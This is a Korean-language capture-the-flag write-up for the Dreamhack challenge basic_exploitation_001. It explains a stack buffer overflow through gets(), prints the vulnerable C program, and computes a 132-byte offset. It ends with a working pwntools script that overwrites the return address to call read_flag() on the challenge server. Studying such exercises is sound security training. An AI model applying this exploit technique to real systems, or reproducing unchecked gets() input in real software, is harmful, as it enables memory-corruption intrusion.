## Concept

BOF(Buffer Overflow)는 프로그램이 버퍼에 데이터를 쓸 때 버퍼의 크기를 초과하여 인접한 메모리 영역을 덮어쓸 수 있는 취약점이다. C/C++ 계열 언어는 버퍼 크기를 자동으로 검증하지 않기 때문에, 입력값 길이를 제한하지 않으면 발생한다.

이 문제에서는 `get_shell()` 대신 `read_flag()` 함수가 존재한다. BOF로 Return Address를 `read_flag()`의 주소로 덮어써서 플래그를 직접 출력시키는 **실행 흐름 조작** 방식을 사용한다.

### 발생 원인

`gets()`는 입력 길이를 전혀 검사하지 않아 BOF의 대표적인 원인 함수다. 어떤 길이의 입력이 들어오더라도 버퍼 크기를 무시하고 그대로 스택에 쓴다.

### 메모리 구조와의 관계

스택 프레임은 아래와 같은 구조로 배치된다.

```
[ 낮은 주소 ]
+------------------+
|      buf[]       |  <-- 사용자 입력이 쓰이는 버퍼
+------------------+
|    SFP (4byte)   |  <-- 저장된 베이스 포인터 (32비트)
+------------------+
|  Return Address  |  <-- read_flag() 주소로 덮어씀
+------------------+
[ 높은 주소 ]
```

## 문제

`basic_exploitation_001` 문제는 BOF 취약점이 존재하는 서버에 요청을 보내 플래그를 획득하는 문제이다.

### 서비스 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_flag() {
    system("cat flag");
}

int main(int argc, char *argv[]) {
    char buf[0x80];

    initialize();

    gets(buf);

    return 0;
}
```
{: file="basic_exploitation_001.c"}

`gets(buf)`는 입력 길이 제한이 없어 0x80(=128)바이트를 초과하는 입력으로 BOF가 발생한다. 바이너리 내에 `read_flag()` 함수가 존재하며, 이 함수가 실행되면 `system("cat flag")`로 플래그가 출력된다.

GDB에서 `main`을 디스어셈블하면 `add esp, 0xffffff80`으로 스택에 0x80(=128)바이트가 할당되고, `lea eax, [ebp-0x80]`으로 버퍼의 시작 주소가 `gets`의 인자로 넘어가는 것을 확인할 수 있다.

![disas](/assets/img/posts/bof/bof1/disas.png)

`info functions`로 심볼 목록을 확인하면 `read_flag` 함수의 주소(`0x080485b9`)를 얻을 수 있다.

![symbols](/assets/img/posts/bof/bof1/readflag.png)

### 오프셋 계산

Return Address까지 덮어쓰기 위한 오프셋을 계산한다.

```
buf  = 0x80 (128바이트)
SFP  = 4바이트 (32비트 환경)
──────────────────────────
합계 = 132바이트  →  오프셋 = 132
```

```
[ 낮은 주소 ]
+---------------------------+
|   buf (128byte)           |  <-- "A" * 128
+---------------------------+
|   SFP  (4byte)            |  <-- "A" * 4
+---------------------------+
|  Return Address  (4byte)  |  <-- p32(0x080485b9) → read_flag()
+---------------------------+
[ 높은 주소 ]
```

### 로컬 테스트

서버에 페이로드를 보내기 전에 로컬 바이너리에서 먼저 동작을 검증한다. 테스트용 `flag` 파일을 작성해두고 `process()`로 로컬 실행 후 셸에서 `ls`로 플래그 파일이 출력되는지 확인한다.

![local_test](/assets/img/posts/bof/bof1/localexcute.png)

로컬에서 `read_flag()`가 정상적으로 호출되어 플래그 파일이 읽히는 것을 확인했다.

### 익스플로잇

로컬 검증 후 `process()`를 `remote()`로 교체해 문제 서버에 페이로드를 전송한다.

```python
from pwn import *
context.log_level = 'debug'

p = remote('host3.dreamhack.games', 24119)

read_flag = 0x080485b9  # read_flag() 함수 주소

payload  = b"A" * 128   # buf 채우기
payload += b"A" * 4     # SFP 덮기
payload += p32(read_flag)  # Return Address → read_flag()

p.send(payload)

p.interactive()
```
